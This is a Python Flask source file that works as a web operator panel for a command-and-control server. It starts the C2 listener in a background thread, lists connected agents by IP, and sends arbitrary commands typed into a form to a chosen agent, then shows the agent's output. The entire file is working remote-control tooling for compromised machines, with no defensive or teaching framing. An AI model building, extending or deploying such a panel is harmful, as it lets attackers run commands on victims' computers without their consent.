from flask import Flask, render_template, request
import threading
import time
import os
import server  # Importing the C2 server script

app = Flask(__name__)

def init_server():
    print("[+] Starting C2 server...")
    server_thread = threading.Thread(
        target=server.start_server,
        daemon=True
    )
    server_thread.start()

# Prevent double execution in Flask debug mode
if not app.debug or os.environ.get("WERKZEUG_RUN_MAIN") == "true":
    init_server()


@app.route("/")
def home():
    return render_template(
        "index.html",
        threads=server.THREADS,
        ips=server.IPS
    )


@app.route("/<string:agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html", name=agentname)


@app.route("/<string:agentname>/execute", methods=["POST"])
def execute(agentname):
    cmd = request.form["command"]

    req_index = None
    for i in range(len(server.IPS)):
        if server.IPS[i] and agentname == f"Agent {i+1}":
            req_index = i
            break

    if req_index is not None:
        print(f"[*] Sending command to Agent {req_index + 1}: {cmd}")
        server.CMD_INPUT[req_index] = cmd
        time.sleep(2)
        cmdoutput = server.CMD_OUTPUT[req_index]
        server.CMD_OUTPUT[req_index] = ""
    else:
        cmdoutput = "Agent not found."

    return render_template(
        "execute.html",
        cmdoutput=cmdoutput,
        name=agentname
    )


if __name__ == "__main__":
    app.run(debug=True, use_reloader=False)

